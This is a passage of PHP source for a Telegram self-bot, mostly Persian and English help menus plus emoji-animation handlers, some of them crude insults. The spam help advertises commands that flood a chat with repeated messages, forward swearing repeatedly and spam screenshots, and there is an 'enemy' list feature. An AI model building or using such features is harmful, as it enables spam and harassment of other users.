🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>bold on</code> «•
•» روشن کردن حالت بولد نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>bold off</code> «•
•» خاموش کردن حالت بولد نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>strikethrough on</code> «•
•» روشن کردن حالت strikethrough «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>strikethrough off</code> «•
•» خاموش کردن حالت strikethrough «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>italic on</code> «•
•» روشن کردن حالت کج نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>italic off</code> «•
•» خاموش کردن حالت کج نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>underline on</code> «•
•» روشن کردن حالت زیرخط نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>underline off</code> «•
•» خاموش کردن حالت زیرخط نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>part on</code> «•
•» روشن کردن حالت تیکه تیکه نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>part off</code> «•
•» خاموش کردن حالت تیکه تیکه نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>coding on</code> «•
•» روشن کردن حالت کد نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>coding off</code> «•
•» خاموش کردن حالت کد نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>mention on</code> «•
•» روشن کردن حالت منشن نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>mention off</code> «•
•» خاموش کردن حالت منشن نویسی «•
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫  
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(spamhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ꜱᴘᴀᴍʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» flood  [Text] [Number] «•
•» Spam your sentence in a message «•
•» Example «•
flood 10 Hi
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» spam  [Text] [Number] «•
•» Send a message to the desired number «•
•» Example «•
spam 10 Hi
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>for</code> «•
•» Forward swearing frequently «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>spam ss</code> «•
•» To spam a screenshot (Only Pv) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ꜱᴘᴀᴍʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» flood  [تعداد] [متن] «•
•» اسپم جمله تو یک پیام «•
•» مثال «•
flood 10 سلام
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» spam  [تعداد] [متن] «•
•» ارسال یک پیام ب تعداد دلخواه «•
•» مثال «•
spam 10 سلام
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>for</code> «•
•» فوروارد فحش بصورت مکرر «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>spam ss</code> «•
•» برای اسپم کردن اسکرین گرفتن «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(answerhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ᴀɴꜱᴡᴇʀʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /setanswer  Answer|Text  «•
•» Set auto-reply to a word or sentence «•
•» Example «•
/setanswer PawnSelf|Hi 
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /delanswer  [Text] «•
•» Delete auto-reply «•
•» Example «•
/delanswer PawnSelf
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /answerlist «•
•» Get automatic answer list «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ᴀɴꜱᴡᴇʀʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /setanswer  جواب|متن  «•
•» تنظیم جواب خودکار برای یه کلمه یا جمله «•
•» مثال «•
/setanswer PawnSelf|baleArbab 
•» فارسیم میتونین بنویسین «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /delanswer  [متن] «•
•» حذف جواب خودکار «•
•» مثال «•
/delanswer PawnSelf
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /answerlist «•
•» دریافت لیست جواب خودکار «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(otherhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
|❦ ꜱᴇʟꜰ ʙᴏᴛ ᴏᴛʜᴇʀʜᴇʟᴘ ❦|
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
┏•» <code>/bot  on</code> Or <code>/bot off</code> «•
┣•» Turn the robot on and off «•
┇
┣•» <code>/restart</code> «•
╪•» Restart the robot «•
┇
┣•» <code>bot</code> «•
╪•» Notice that the robot is online «•
┇
┣•» <code>load</code> «•
╪•» Get Ping Server «•
┇
┣•» <code>hash text</code> «•
╪•» Hash the desired text «•
┇
┣•» <code>/proxy</code> «•
╪•» Receive Telegram proxy!! «•
┇
┣•» <code>/ping site.com</code> «•
╪•» Ping the desired site! «•
┇
┣•» <code>encode text</code> «•
╪•» Encoding text (Base64 encryption) «•
┇
┣•» <code>decode text</code> «•
╪•» Decoding text (Base64 encryption) «•
┇
┣•» <code>left</code> «•
╪•» Left the group  «•
┇
┣•» <code>coder</code> «•
┗•» To see the bot maker «•
࿇ ══━━━━✥◈✥━━━━══ ࿇
 |=   ●──────•── 12:10   =|
 |=   ⇆ㅤ◁ㅤ ❚❚ㅤ ▷ㅤ↻   =|
 ࿇ ══━━━━✥◈✥━━━━══ ࿇
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
|❦ ꜱᴇʟꜰ ʙᴏᴛ ᴏᴛʜᴇʀʜᴇʟᴘ ❦|
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
•» <code>/bot  on</code> Or <code>/bot off</code> «•
•» روشن یا خاموش کردن ربات «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>/restart</code> «•
•» ریستارت کردن ربات «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>bot</code> «•
•» باخبر شدن از آنلاین بودن ربات «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>load</code> «•
•» گرفتن پینگ سرور «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>hash text</code> «•
•» هش کردن متن «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>/proxy</code> «•
•» گرفتن پروکسی تلگرام!! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>/ping site.com</code> «•
•» گرفتن پینگ سایت موردنظر! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>encode text</code> «•
•» انکد کردن متن (Base64 encryption) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>decode text</code> «•
•» دیکد کردن متن (Base64 encryption) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>left</code> «•
•» لفت دادن از گروه  «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>coder</code> «•
•» دیدن سازنده ربات «•
࿇ ══━━━━✥◈✥━━━━══ ࿇
 |=   ●──────•── 12:10   =|
 |=   ⇆ㅤ◁ㅤ ❚❚ㅤ ▷ㅤ↻   =|
 ࿇ ══━━━━✥◈✥━━━━══ ࿇
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(enemyhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
┏━━━ ꜱᴇʟꜰ ʙᴏᴛ ᴇɴᴇᴍʏʜᴇʟᴘ ━━━┓
┇
┣⍣ <code>/setenemy</code>  Number ID
┣⍣ Adjust the enemy
┇
┣⍣ <code>/delenemy</code> Number ID
┣⍣ Remove user from enemy list
┇
┣⍣ <code>reset enemylist</code>
┣⍣ Clear the enemy list 
┇
┗━━━━ ︻╦デ╤━╼  •  •  • ━━━━━┛
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
┏━━━ ꜱᴇʟꜰ ʙᴏᴛ ᴇɴᴇᴍʏʜᴇʟᴘ ━━━┓
┇
 <code>/setenemy</code>  Number ID
 افزودن کاربر به لیست دشمن
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>/delenemy</code> Number ID
 حذف کاربر از لیست دشمن
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>reset enemylist</code>
 پاکسازی لیست دشمن 
┗━━━━ ︻╦デ╤━╼  •  •  • ━━━━━┛
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(gphelp|گپ هلپ)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ɢaᴘ ʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
╔•» <code>ban replay</code> «•
╠•» Ban User «•
┇
╠•» <code>unban replay</code> «•
╠•» UnBan User «•
┇
╠•» <code>silent replay</code> «•
╠•» Silent User «•
┇
╠•» <code>unsilent replay</code> «•
╠•» Unsilent User «•
┇
╠•» <code>delall replay</code> «•
╠•» Delete all user messages by replaying  «•
┇
╠•» <code>tagall</code> «•
╠•» Tag everyone in the group «•
┇
╠•» <code>locklink on Or off</code> «•
╠•» Turn on locklink mode «•
┇
╠•» <code>lockgp on Or off</code> «•
╠•» Turn off lockgp mode «•
┇
╠•» <code>clean ᴍꜱɢ</code> «•
╠•» Clear messages! «•
╚•» Example : <code>clean 100</code> «•
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫
-Note that you must have the desired permissions in the chat you use
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ɢaᴘ ʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>ban replay</code> 
 ֍ بن کردن با ریپلی کردن روی کاربر ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>unban replay</code> 
 ֍ حذف بن با ریپلی کردن روی کاربر ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>silent replay</code> 
֍ سکوت کردن با ریپلی کردن روی کاربر ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>unsilent replay</code> 
֍  حذف سکوت کردن با ریپلی کردن روی کاربر ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>delall replay</code> 
֍ حذف تمامی پیام های کاربر با ریپلی کردن ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>tagall</code> 
 ֍ تگ کردن تمام افراد موجود در گروه ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>locklink on Or off</code> 
 ֍ روشن کردن حالت قفل لینک ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>lockgp on Or off</code> 
֍ روشن کردن حالت قفل گپ ֍
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
 <code>clean ᴍꜱɢ</code> 
֍ پاکسازی پیام ها! ֍
 Example : <code>ᴄʟᴇᴀɴ 100</code> 
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫
-توجه داشته باشید شما در گروه باید پرمیشن مورد نظر را داشته باشید
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(help|selfhelp|helpfa|راهنما)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
+=====================+
|~🔧ꜱᴇʟꜰ ʙᴏᴛ ʜᴇʟᴘ ʟɪꜱᴛ🔧~|
+=====================+
⚡ | <code>timehelp</code> | ⚡
✨ | <code>actionshelp</code> | ✨
🌠 | <code>otherhelp</code> | 🌠
🔥 | <code>funhelp</code> | 🔥
⭐ | <code>funhelp2</code> | ⭐
☀️ | <code>texthelp</code> | ☀️
🌙 | <code>spamhelp</code> | 🌙
🔱 | <code>answerhelp</code> | 🔱
📀 | <code>enemyhelp</code> | 📀
🎗 | <code>gphelp</code> | 🎗
🔰 | <code>setlang fa Or en</code> | 🔰
⚜️ | <code>Stats</code> | ⚜️
+====================+
|~»»⚙YasinShady⚙️««~|
|~»»⚙@Yasin_431⚙️««~|
+====================+
",
                            'parse_mode' => 'Markdown']);
                    }

                    if ($text == 'stats' or $text == 'آمار' or $text == 'Stats' or $text == 'sTaTs') {
                        $res = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
                        $g = json_encode($res);
                        $gf = json_decode($g);
                        $users = $gf->user;
                        $groups = $gf->chat;
                        $supergroups = $gf->supergroup;
                        $channels = $gf->channel;
                        $bots = $gf->bot;
                        $all = $users + $groups + $supergroups + $channels + $bots;
                        $mem = memory_get_usage();
                        $ver = phpversion();
                        $ver = phpversion();
                        $Timebio = file_get_contents("timebio.txt");
                        $Timename = file_get_contents("online.txt");
                        $Timepic = file_get_contents("timepic.txt");
                        $Bold = file_get_contents("bold.txt");
                        $italic = file_get_contents("italic.txt");
                        $Answeres = file_get_contents("markread.txt");
                        $Gameplay = file_get_contents("gameplay.txt");
                        $Markread = file_get_contents("markread.txt");
                        $Typinges = file_get_contents("typing.txt");
                        $partmode = file_get_contents("part.txt");
                        $codingmode = file_get_contents("coding.txt");
                        $strikethrough = file_get_contents("strikethrough.txt");
                        $undermode = file_get_contents("underline.txt");
                        $audioaction = file_get_contents("audioaction.txt");
                        $lockpv = file_get_contents("lockpv.txt");
                        $hashtagmode = file_get_contents("hashtag.txt");
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
Sᴛᴀᴛᴜs ᴛɪᴍᴇʙɪᴏ : $Timebio 
Sᴛᴀᴛᴜs Tʏᴘɪɴɢ : $Typinges
Sᴛᴀᴛᴜs ᴛɪᴍᴇᴘɪᴄ : $Timepic
Sᴛᴀᴛᴜs ʙᴏʟᴅᴛᴇxᴛ : $Bold
Sᴛᴀᴛᴜs ᴛɪᴍᴇɴᴀᴍᴇ : $Timename
Sᴛᴀᴛᴜs ɪᴛᴀʟɪᴄ : $italic
Sᴛᴀᴛᴜs ʟᴏᴄᴋᴘᴠ : $lockpv
Sᴛᴀᴛᴜs Aɴsᴡᴇʀ : $Answeres
Sᴛᴀᴛᴜs ɢᴀᴍᴇᴘʟᴀʏ : $Gameplay
Sᴛᴀᴛᴜs ᴍᴀʀᴋʀᴇᴀᴅ : $Markread
Sᴛᴀᴛᴜs ᴘᴀʀᴛᴍᴏᴅᴇ : $partmode
Sᴛᴀᴛᴜs ᴀᴜᴅɪᴏᴀᴄᴛɪᴏɴ : $audioaction
Sᴛᴀᴛᴜs ʜᴀꜱʜᴛᴀɢᴍᴏᴅᴇ : $hashtagmode
Sᴛᴀᴛᴜs ᴜɴᴅᴇʀʟɪɴᴇ : $undermode
Sᴛᴀᴛᴜs ꜱᴛʀɪᴋᴇᴛʜʀᴏᴜɢʜ : $strikethrough
Sᴛᴀᴛᴜs ᴄᴏᴅɪɴɢ : $codingmode
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
➣ ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 

ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥", 'parse_mode' => 'MarkDown']);
                    }
                    if ($text == '/GhohNakhordokhtar' or $text == 'گوه نخور پسر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩________________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_______________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_____________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️____________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩__________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️_______🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩____🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️__🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩نوش جان💩']);
                    }

                    if ($text == '/GhohNakhordokhtar' or $text == 'گوه نخور دختر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩________________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_______________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_____________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️____________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩__________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️_______🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩____🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️__🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩نوش جان💩']);
                    }
                    if ($text == '/Ravani' or $text == 'روانی') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🚶🏿‍♀________________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_______________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀______________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_____________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀____________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀___________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀__________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_______🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀______🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀____🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀___🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀__🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏨']);
                    }
                    if ($text == 'تانک' or $text == 'tank') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "تانک رو دیدی؟؟🤔"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "دیگه نمیبینی😆"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💥🔥بوم💥🔥"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙"]);

                    }
                    if ($text == 'دایناسور') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█ 
█▲▲▲▲▲"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█ 
█▲▲▲▲▲
█████████
 ██ ██"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█  
█▲▲▲▲▲
█████████
 ██ ██"]);

                    }
                    if ($text == 'hack' or $text == 'Hack' or $text == 'هک' or $text == 'هک شدی') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ 
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
